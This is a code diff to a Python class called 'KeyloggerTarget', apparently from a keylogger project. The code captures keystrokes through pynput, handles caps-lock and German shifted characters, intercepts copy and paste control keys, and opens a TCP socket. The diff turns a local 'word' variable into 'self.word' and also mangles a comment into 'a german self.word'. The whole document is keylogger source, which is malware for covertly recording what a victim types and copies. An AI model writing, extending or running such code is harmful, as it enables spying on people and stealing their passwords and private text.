@@ -36,6 +36,7 @@ class KeyloggerTarget:
         self.caps = False
         self.richtige_liste = []
         self.coordinates = []
+        self.word = None
 
     def daten_aufnehemen(self):
         listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -206,7 +207,7 @@ class KeyloggerTarget:
     def print_work(self, word):
         print(f'Alphabetic key was pressed: {word} ')
         self.richtige_liste += word
-        # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
+        # Every pressed key will be saved in "richtige_liste" this is a german self.word and means "right_list"
 
     def on_press(self, key):
         try:
@@ -215,12 +216,12 @@ class KeyloggerTarget:
                                     "9": ")", "0": "=", "ß": "?"}
                 if self.caps is True:
                     if key.char in other_charecters:
-                        word = other_charecters[key.char]
+                        self.word = other_charecters[key.char]
                         # Upper Characters from "1" to "0" because all this numbers are not charecters are not in pynput
                     else:
-                        word = key.char.upper()
+                        self.word = key.char.upper()
                 else:
-                    word = key.char
+                    self.word = key.char
 
                 all_req_keys = {"": self.copy_data, "": self.append_paste}
                 # "ETX" stands for "End-Text-character" and is a control character which knows the character of copying something on the keyboard
@@ -230,15 +231,15 @@ class KeyloggerTarget:
                         # If the copy character is pressed, each function of each character will be working
                         all_req_keys[each_key]()
                 try:
-                    asci_number = ord(word)
+                    asci_number = ord(self.word)
                     # Ordinal number in the range of 0 to 31 completes all special characters with the key "strg + letter"
                     if asci_number not in range(0, 32):
                         # if there is no special character it just prints the alphabetic number
-                        self.print_work(word)
+                        self.print_work(self.word)
 
                 except TypeError:
                     # prints the alphabetc number
-                    self.print_work(word)
+                    self.print_work(self.word)
 
                 print(self.richtige_liste)
             except TypeError:
